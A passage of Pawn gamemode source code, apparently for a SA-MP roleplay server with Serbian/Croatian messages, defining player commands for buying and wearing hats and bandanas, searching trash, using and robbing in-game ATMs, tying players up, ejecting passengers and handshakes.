	bandanas[4] = 18916;
	bandanas[5] = 18917;
	bandanas[6] = 18918;
	bandanas[7] = 18919;
	bandanas[8] = 18920;
	ShowModelSelectionMenuEx( playerid, bandanas, 9, "Bandanas", 2, 90.0, 90.0, 0.0);
	return true;
}

CMD:buyhbandanas( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 171.4970, -92.8723, 1001.8047 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Zipu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)." );
	if( PlayerInfo[ playerid ][ xHead ] != 0) return SendErrorMessage( playerid, "Vec imate kupljenu kapu/bandanu/sesir." );
	new bandanas[19];
	bandanas[0] = 18891;
	bandanas[1] = 18892;
	bandanas[2] = 18893;
	bandanas[ 3 ] = 18894;
	bandanas[4] = 18895;
	bandanas[5] = 18896;
	bandanas[6] = 18897;
	bandanas[7] = 18898;
	bandanas[8] = 18899;
	bandanas[9] = 18900;
	bandanas[10] = 18901;
	bandanas[11] = 18902;
	bandanas[12] = 18903;
	bandanas[13] = 18904;
	bandanas[14] = 18905;
	bandanas[15] = 18906;
	bandanas[16] = 18907;
	bandanas[17] = 18908;
	bandanas[18] = 18910;
	ShowModelSelectionMenuEx( playerid, bandanas, 19, "Bandanas", 3, 90.0, 90.0, 0.0);
	return true;
}

CMD:buycaps( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 209.3052,-7.9960,1005.2109 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Victimu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 700 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(700$)." );
	if( PlayerInfo[ playerid ][ xHead ] != 0) return SendErrorMessage( playerid, "Vec imate kupljenu kapu/bandanu/sesir." );
	new bandanas[5];
	bandanas[0] = 18939;
	bandanas[1] = 18940;
	bandanas[2] = 18941;
	bandanas[ 3 ] = 18942;
	bandanas[4] = 18943;
	ShowModelSelectionMenuEx( playerid, bandanas, 5, "Caps", 4, 0.0, -90.0, 0.0);
	return true;
}

CMD:buyhats( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 205.0401,-100.3267,1005.2578 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Bincu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 600 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(600$)." );
	if( PlayerInfo[ playerid ][ xHead ] != 0) return SendErrorMessage( playerid, "Vec imate kupljenu kapu/bandanu/sesir." );
	new bandanas[22];
	bandanas[0] = 19067;
	bandanas[1] = 19068;
	bandanas[2] = 19069;
	bandanas[ 3 ] = 18926;
	bandanas[4] = 18927;
	bandanas[5] = 18928;
	bandanas[6] = 18929;
	bandanas[7] = 18930;
	bandanas[8] = 18931;
	bandanas[9] = 18932;
	bandanas[10] = 18933;
	bandanas[11] = 18934;
	bandanas[12] = 18935;
	bandanas[13] = 19093;
	bandanas[14] = 19160;
	bandanas[15] = 18944;
	bandanas[16] = 18945;
	bandanas[17] = 18946;
	bandanas[18] = 18947;
	bandanas[19] = 18948;
	bandanas[20] = 18949;
	bandanas[21] = 18950;
	bandanas[21] = 18951;
	ShowModelSelectionMenuEx( playerid, bandanas, 22, "Hats", 5, 0.0, -90.0, 0.0);
	return true;
}

CMD:trazi( playerid, params[] ) {
    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
    if( TrashSearch[ playerid ] == 1 ) return SendErrorMessage( playerid, "Vec trazite po kontejneru!");
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da trazis dok si u vozilu." );
	if( TrashLimit[ playerid ] != 0 ) return SendErrorMessage( playerid, "Morate sacekati 30 minuta pre nego sto trazite ponovo!");
	if( Maskuse[ playerid ] == true )
		format( globalstring, sizeof( globalstring ), "Maska_%d otvara kontejner, naginje se i pocinje traziti.", PlayerInfo[ playerid ][ xMaskID ] );
	else
		format( globalstring, sizeof( globalstring ), "%s otvara kontejner, naginje se i pocinje traziti.", ImeIgraca( playerid ) );
	PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	TogglePlayerControllable( playerid, false );
   	Odbrojavanje[ playerid ] = 25;
	VremeTDControl( playerid, true );
   	TrashLimit[ playerid ] = 1800;
   	TrashSearch[ playerid ] = 1;
    TrashTimer[ playerid ] = SetTimerEx( "TrashLimitOff", 25000, false, "i", playerid );
    ApplyAnimation(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return true;
}

CMD:robatm( playerid, params[] ) {

	if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
		return 1;
	}
	
	if( !ShowedAtmTD[ playerid ] ) {
	    if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Tek sa levelom 3+ mozes da opljackas bankomat." );
	    if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );
    	new atmid = GetNearestAtm( playerid );
    	if( PlayerInfo[ playerid ][ xPljackaVreme ] != 0 ) return SendErrorMessage( playerid, "Vec si pljackao, do sledece pljacke sacekaj %d minuta.", PlayerInfo[ playerid ][ xPljackaVreme ] );
	    if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
		atmTDControl( playerid, true );
		SelectTextDraw( playerid, SRVBOJA1 );
		SendInfoMessage( playerid, "Da ugasis menu za pljackanje bankomata ukucaj ponovo '/robatm'." );
	}
	else if( ShowedAtmTD[ playerid ] ) {
	    atmTDControl( playerid, false );
	    SendInfoMessage( playerid, "Ugasili ste meni za pljackanje bankomata." );
	}
	return true;
}

CMD:atm( playerid, params[] ) {
    if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci i uzmes karticu za bankomat." );
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u vozilu." );
	if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );
	new item[32];
	if( sscanf( params, "s[32] ", item)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/atm [opcija]");
     	SCM( playerid, BELA, "[Opcije] status, withdraw");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "status",true) == 0) {
	    format( globalstring, sizeof( globalstring ), "Imate $%d na vasem bankovnom racunu.", PlayerInfo[ playerid ][ xBRacun ] );
		SendClientMessage( playerid, ZUTA, globalstring );
		return 1;
	}
	else if( strcmp( item, "withdraw",true) == 0) {
	    new cashdeposit;
		if( sscanf( params, "s[32]i", item, cashdeposit ) ) {
			SendUsageMessage( playerid, "/atm withdraw [ iznos ]");
			return 1;
		}
		if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novca !");
		DajIgracuNovac( playerid, cashdeposit );
		PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit ;
		format( globalstring, sizeof( globalstring ), "Podigli ste $%d s vaseg racuna. Na racunu ima: $%d ", cashdeposit, PlayerInfo[ playerid ][ xBRacun ] );
		SCM( playerid, ZUTA, globalstring); UpdateBankTD( playerid );
		return 1;
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/atm [opcija]");
     	SCM( playerid, BELA, "[Opcije] status, withdraw");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}
CMD:baci( playerid, params[] ) {
    new item[32];
	if( sscanf( params, "s[32] ", item)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/baci [opcija]");
     	SCM( playerid, BELA, "[Opcije] face, head, naocare, kaciga, sat");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "face",true) == 0) {
	    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
	    if( PlayerInfo[ playerid ][ xFace ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes maramu(bandanu)." );
        if( FaceOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da skines maramu sa glave(/face)." );
		PlayerInfo[ playerid ][ xFace ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 0 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 1 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 2 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 3 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 4 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 5 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 6 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 7 ] = 0;
		PlayerInfo[ playerid ][ xFacePos ][ 8 ] = 0;
		SCM( playerid, SRVBOJA1, "Bacio si maramu(bandanu) u kontejner(nemas je vise u statsima). " );
		return 1;
	}
	else if( strcmp( item, "head",true) == 0) {
	    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
	    if( PlayerInfo[ playerid ][ xHead ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes kapu/sesir/maramu(bandanu)." );
        if( HeadOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da skines kapu/sesir/maramu sa glave(/head)." );
        PlayerInfo[ playerid ][ xHead ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 0 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 1 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 2 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 3 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 4 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 5 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 6 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 7 ] = 0;
		PlayerInfo[ playerid ][ xHeadPos ][ 8 ] = 0;
		SCM( playerid, SRVBOJA1, "Bacio si kapu/sesir/maramu(bandanu) u kontejner(nemas je vise u statsima). " );
		return 1;
	}
	else if( strcmp( item, "naocare",true) == 0) {
	    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
	    if( PlayerInfo[ playerid ][ xSungMask ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes naocare." );
        if( SungOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da skines naocare sa glave(/naocare)." );
		PlayerInfo[ playerid ][ xSungMask ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] = 0;
		PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] = 0;
		SCM( playerid, SRVBOJA1, "Bacio si naocare u kontejner(nemas je vise u statsima). " );
		return 1;
	}
	else if( strcmp( item, "kaciga",true) == 0) {
	    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
	    if( PlayerInfo[ playerid ][ xHelmet ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes kacigu." );
        if( HelmetOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da skines kacigu sa glave(/kaciga)." );
		PlayerInfo[ playerid ][ xHelmet ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 0 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 1 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 2 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 3 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 4 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 5 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] = 0;
		PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] = 0;
		SCM( playerid, SRVBOJA1, "Bacio si kacigu u kontejner(nemas je vise u statsima). " );
		return 1;
	}
	else if( strcmp( item, "sat",true) == 0) {
	    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
	    if( PlayerInfo[ playerid ][ xSat ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes sat." );
	    PlayerInfo[ playerid ][ xSat ] = 0;
		SCM( playerid, SRVBOJA1, "Bacio si sat u kontejner(nemas ga vise u statsima)." );
		return 1;
	}
	else {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/baci [opcija]");
     	SCM( playerid, BELA, "[Opcije] face, head, naocare, kaciga, sat");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}
CMD:izmeni( playerid, params[] ) {
    new item[32];
	if( sscanf( params, "s[32] ", item)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/izmeni [opcija]");
     	SCM( playerid, BELA, "[Opcije] face, head, naocare, kaciga");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "face",true) == 0) {
	    if( PlayerInfo[ playerid ][ xFace ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes maramu(bandanu)." );
        if( !FaceOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da stavis maramu na glavu(/face)." );
        EditAttachedObject( playerid, OBJECT_SLOT_BANDANA); EditingBody[ playerid ] = 2;
		return 1;
	}
	else if( strcmp( item, "head",true) == 0) {
	    if( PlayerInfo[ playerid ][ xHead ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes kapu/sesir/maramu(bandanu)." );
        if( !HeadOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da stavis kapu/sesir/maramu na glavu(/head)." );
        EditAttachedObject( playerid, OBJECT_SLOT_HEAD); EditingBody[ playerid ] = 3;
		return 1;
	}
	else if( strcmp( item, "naocare",true) == 0) {
	    if( PlayerInfo[ playerid ][ xSungMask ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes naocare." );
        if( !SungOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da stavis naocare na glavu(/naocare)." );
        EditAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL); EditingBody[ playerid ] = 1;
		return 1;
	}
	else if( strcmp( item, "kaciga",true) == 0) {
	    if( PlayerInfo[ playerid ][ xHelmet ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes kacigu." );
        if( !HelmetOn[ playerid ] ) return SendErrorMessage( playerid, "Prvo moras da stavis kacigu na glavu(/kaciga)." );
        EditAttachedObject( playerid, OBJECT_SLOT_HELMET ); EditingBody[ playerid ] = 6;
		return 1;
	}
	else {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/izmeni [opcija]");
     	SCM( playerid, BELA, "[Opcije] face, head, naocare, kaciga");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}
CMD:face( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xFace ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes maramu(bandanu)." );
    if( !FaceOn[ playerid ] ) {
    
        SetPlayerAttachedObject( playerid, OBJECT_SLOT_BANDANA, PlayerInfo[ playerid ][ xFace ],2,PlayerInfo[ playerid ][ xFacePos ][ 0 ],PlayerInfo[ playerid ][ xFacePos ][ 1 ],PlayerInfo[ playerid ][ xFacePos ][ 2 ],PlayerInfo[ playerid ][ xFacePos ][ 3 ],PlayerInfo[ playerid ][ xFacePos ][ 4 ],PlayerInfo[ playerid ][ xFacePos ][ 5 ],PlayerInfo[ playerid ][ xFacePos ][ 6 ],PlayerInfo[ playerid ][ xFacePos ][ 7 ],PlayerInfo[ playerid ][ xFacePos ][ 8 ], 0, 0);
        FaceOn[ playerid ] = true;
    
        if( PlayerInfo[ playerid ][ xFacePos ][ 6 ] > 2.0 || PlayerInfo[ playerid ][ xFacePos ][ 7 ] > 2.0 || PlayerInfo[ playerid ][ xFacePos ][ 8 ] > 2.0 ) {
			SendErrorMessage( playerid, "Losa pozicija marame odradi je ponovo." );
			EditAttachedObject( playerid, OBJECT_SLOT_BANDANA ); EditingBody[ playerid ] = 2;
	        return true;
		}
        
        SendInfoMessage( playerid, "Stavio si maramu na glavu." );
	}
	else if( FaceOn[ playerid ] ) {
	    RemovePlayerAttachedObject( playerid, OBJECT_SLOT_BANDANA);
	    FaceOn[ playerid ] = false;
	    SendInfoMessage( playerid, "Skinuo si maramu sa glave." );
	}
	return true;
}
CMD:kaciga( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xHelmet ] == 0 ) return SendErrorMessage( playerid, "Nemate kacigu." );
	if( !HelmetOn[ playerid ] ) {
	
	    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HELMET ) ) return SendErrorMessage( playerid, "Vec imate objekt na glavi.");
        SetPlayerAttachedObject( playerid, OBJECT_SLOT_HELMET, PlayerInfo[ playerid ][ xHelmet ],2,PlayerInfo[ playerid ][ xHelmetPos ][ 0 ],PlayerInfo[ playerid ][ xHelmetPos ][ 1 ],PlayerInfo[ playerid ][ xHelmetPos ][ 2 ],PlayerInfo[ playerid ][ xHelmetPos ][ 3 ],PlayerInfo[ playerid ][ xHelmetPos ][ 4 ],PlayerInfo[ playerid ][ xHelmetPos ][ 5 ],PlayerInfo[ playerid ][ xHelmetPos ][ 6 ],PlayerInfo[ playerid ][ xHelmetPos ][ 7 ],PlayerInfo[ playerid ][ xHelmetPos ][ 8 ], 0, 0);
		HelmetOn[ playerid ] = true;
	
        if( PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] > 2.0 || PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] > 2.0 || PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] > 2.0 ) {
			SendErrorMessage( playerid, "Losa pozicija kacige odradi je ponovo." );
			EditAttachedObject( playerid, OBJECT_SLOT_HELMET ); EditingBody[ playerid ] = 6;
	        return true;
		}

        SendInfoMessage( playerid, "Stavio si kacigu na glavu." );
	}
	else if( HelmetOn[ playerid ] ) {
	    RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HELMET );
	    HelmetOn[ playerid ] = false;
	    SendInfoMessage( playerid, "Skinuo si kacigu sa glave." );
	}
	return true;
}
CMD:head( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xHead ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes kapu/sesir/maramu(bandanu)." );
	if( !HeadOn[ playerid ] ) {

        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) return SendErrorMessage( playerid, "Vec imate objekt na glavi." );
		SetPlayerAttachedObject( playerid, OBJECT_SLOT_HEAD, PlayerInfo[ playerid ][ xHead ],2,PlayerInfo[ playerid ][ xHeadPos ][ 0 ],PlayerInfo[ playerid ][ xHeadPos ][ 1 ],PlayerInfo[ playerid ][ xHeadPos ][ 2 ],PlayerInfo[ playerid ][ xHeadPos ][ 3 ],PlayerInfo[ playerid ][ xHeadPos ][ 4 ],PlayerInfo[ playerid ][ xHeadPos ][ 5 ],PlayerInfo[ playerid ][ xHeadPos ][ 6 ],PlayerInfo[ playerid ][ xHeadPos ][ 7 ],PlayerInfo[ playerid ][ xHeadPos ][ 8 ], 0, 0);
        HeadOn[ playerid ] = true;

        if( PlayerInfo[ playerid ][ xHeadPos ][ 6 ] > 2.0 || PlayerInfo[ playerid ][ xHeadPos ][ 7 ] > 2.0 || PlayerInfo[ playerid ][ xHeadPos ][ 8 ] > 2.0 ) {
			SendErrorMessage( playerid, "Losa pozicija kape/sesira/marame odradi je ponovo." );
			EditAttachedObject( playerid, OBJECT_SLOT_HEAD ); EditingBody[ playerid ] = 3;
	        return true;
		}

        SendInfoMessage( playerid, "Stavio si kapu/sesir/maramu na glavu." );
	}
	else if( HeadOn[ playerid ] ) {
	    RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD);
	    HeadOn[ playerid ] = false;
	    SendInfoMessage( playerid, "Skinuo si kapu/sesir/maramu sa glave." );
	}
	return true;
}
CMD:naocare( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xSungMask ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes naocare." );
	if( !SungOn[ playerid ] ) {

        SetPlayerAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL, PlayerInfo[ playerid ][ xSungMask ],2,PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ], 0, 0);
        SungOn[ playerid ] = true;

        if( PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] > 2.0 || PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] > 2.0 || PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] > 2.0 ) {
			SendErrorMessage( playerid, "Losa pozicija naocara odradi je ponovo." );
			EditAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL ); EditingBody[ playerid ] = 1;
	        return true;
		}

        SendInfoMessage( playerid, "Stavio si naocare na glavu." );
	}
	else if( SungOn[ playerid ] ) {
	    RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL);
	    SungOn[ playerid ] = false;
	    SendInfoMessage( playerid, "Skinuo si naocare sa glave." );
	}
	return true;
}

CMD:tie( playerid, params[] ) {
	if( Uze[ playerid ] != true ) {
		SendErrorMessage( playerid, "Nemas uze!" );
		return 1;
	}
	if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 438 ||
	    GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 420 ||
	    GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 431 ||
	    GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 437 ||
	    GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 416 )
	{
		SendErrorMessage( playerid, "Ne mozete svezati nekoga dok ste u taxi-u / autobusu / kolima hitne pomoci.");
		return 1;
	}
	new giveplayerid;
	if( sscanf( params, "u", giveplayerid ) ) {
		SendUsageMessage( playerid, "/tie [ ID/Deo imena ]");
	    return 1;
	}
    if( IsPlayerConnected( giveplayerid ) ) {
	    if( giveplayerid != INVALID_PLAYER_ID ) {
		    if( IgracZavezan[ giveplayerid ] == true ) {
		        SendErrorMessage( playerid, "Igrac je vec zavezan !");
		        return 1;
		    }
		    // if( KnockedDown[ giveplayerid ] != true ) return SendErrorMessage( playerid, "Moras prvo da oboris igraca.(/knockout)." );
			if( IsPlayerNearPlayer( 8.0, playerid, giveplayerid ) ) {
			    new car = GetPlayerVehicleID( playerid );
			    if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes zavezati sam sebe!");
			    if( IsPlayerInAnyVehicle( playerid ) && GetPlayerState( playerid ) == 2 && IsPlayerInVehicle( giveplayerid, car ) ) {
			        format( globalstring, sizeof( globalstring ), "* Zavezan si od strane %s ", ImeIgraca( playerid ) );
					SCM( giveplayerid, SVETLOPLAVA, globalstring );
					format( globalstring, sizeof( globalstring ), "* Zavezaoao si %s ", ImeIgraca( giveplayerid ) );
					SCM( playerid, SVETLOPLAVA, globalstring );

                    if( Maskuse[ playerid ] == false )
						format( globalstring, sizeof( globalstring ), "* %s je svezao %s, da mu nebi pobjegao.", ImeIgraca( playerid ) ,ImeIgraca( giveplayerid ) );
					else
					    format( globalstring, sizeof( globalstring ), "* Maska_%d je svezao %s, da mu nebi pobjegao.", PlayerInfo[ playerid ][ xMaskID ] ,ImeIgraca( giveplayerid ) );

					PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
					GameTextForPlayer( giveplayerid, "~r~Zavezan", 2500, 3 );
					Uze[ playerid ] = false;
					TogglePlayerControllable( giveplayerid, 0 );
					IgracZavezan[ giveplayerid ] = true;
			    } else SendErrorMessage( playerid, "Igrac nije autu, ili vi niste vozac !");
			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
	return 1;
}

CMD:untie( playerid, params[] ) {
	new giveplayerid;
	if( sscanf( params, "u", giveplayerid ) ) {
		SendUsageMessage( playerid, "/untie [ ID/Deo imena ]");
	    return 1;
	}
	if( IsPlayerConnected( giveplayerid ) ) {
		if( giveplayerid != INVALID_PLAYER_ID ) {
		    if( IsPlayerNearPlayer(5.0, playerid, giveplayerid ) ) {
			    if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes odvezati samog sebe");
				if( IgracZavezan[ giveplayerid ] == true ) {
				    format( globalstring, sizeof( globalstring ), "* Odvezan si od strane %s.", ImeIgraca( playerid ) );
					SCM(giveplayerid, SVETLOPLAVA, globalstring);
					format( globalstring, sizeof( globalstring ), "* Odvezao si %s.", ImeIgraca( giveplayerid ) );
					SCM( playerid, SVETLOPLAVA, globalstring );
					GameTextForPlayer( giveplayerid, "~g~Odvezan", 2500, 3 );
					TogglePlayerControllable( giveplayerid, 1 );
					IgracZavezan[ giveplayerid ] = false;
				} else SendErrorMessage( playerid, "Taj igrac nije vezan !");
			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
	return 1;
}

CMD:eject( playerid, params[] ) {
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu da bi ste koristili ovu komandu !");
    if( GetPlayerState( playerid )!= PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Niste vozac !");
	new ID, string[ 75 ];
	if( sscanf( params, "u", ID ) ) {
		SendUsageMessage( playerid, "/eject [ ID/Deo Imena ]");
	    return 1;
	}
	if( IsPlayerConnected( ID ) ) {
	    if( ID != INVALID_PLAYER_ID ) {
			if( ID == playerid ) return SendErrorMessage( playerid, "ne mozete izbaciti sami sebe!");
		    if( IsPlayerInVehicle( ID, GetPlayerVehicleID( playerid ) ) ) {
				format( string, sizeof( string ), "* Izbacili ste %s izvan auta!", ImeIgraca( ID ) );
				SCM( playerid, SVETLOPLAVA, string);
				format( string, sizeof( string ), "* Izbacio vas je iz auta %s !", ImeIgraca( playerid ) );
				SCM( ID, SVETLOPLAVA, string );
				new Float:vehPos[ 3 ];
				getPosBehindVehicle( GetPlayerVehicleID( playerid ), vehPos[0], vehPos[1], vehPos[2], 0.0 );
				Novi_SetPlayerPos( ID, vehPos[0], vehPos[1], vehPos[2] );
			}
			else
			    SendErrorMessage( playerid, "Taj igrac nije u vasem autu !");
		}
	}
	else
		SendErrorMessage( playerid, "Nepravilan ID/DioImena!");
	return 1;
}

CMD:rukovanje( playerid, params[] ) {
    new igrac, vrsta;
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes se rukovati ako si u vozilu!");
	if( sscanf( params, "ui", igrac, vrsta ) ) return SendUsageMessage( playerid, "/rukovanje [ ID/Deo Imena ] [vrsta rukovanja(1-9)]");
	if( IsPlayerConnected(  igrac ) ) {
 		if( igrac != INVALID_PLAYER_ID) {
			if( IsPlayerNearPlayer( 3.0, playerid, igrac ) ) {
                if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Ne mozes se rukovati sa osobom koja je u vozilu!");
			    if( igrac == playerid) return SendErrorMessage( playerid, "Ne mozes se rukovati sam sa sobom!");
				format( globalstring, sizeof( globalstring ), "* Ponudio si rukovanje %s-u.", ImeIgraca( igrac ) );
				SCM( playerid, 0x33CCFFAA, globalstring );
				format( globalstring, sizeof( globalstring ), "* %s ti je ponudio rukovanje.", ImeIgraca( playerid ) );
				SCM( igrac, 0x33CCFFAA, globalstring );
				SCM( igrac, 0xFF6347AA, "* Ako se zelis rukovati,prihvati rukovanje koristeci /prihvati rukovanje.");
				SetPVarInt( playerid, "ShakeOffer", igrac);
				SetPVarInt( igrac, "ShakeOffer", playerid );
				SetPVarInt( igrac, "ShakeStyle", vrsta);
			} else SendErrorMessage( playerid, "Taj igrac nije blizu tebe !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:knockout( playerid, params[] ) {
    new giveplayerid;
	if( sscanf( params, "u", giveplayerid ) ) {
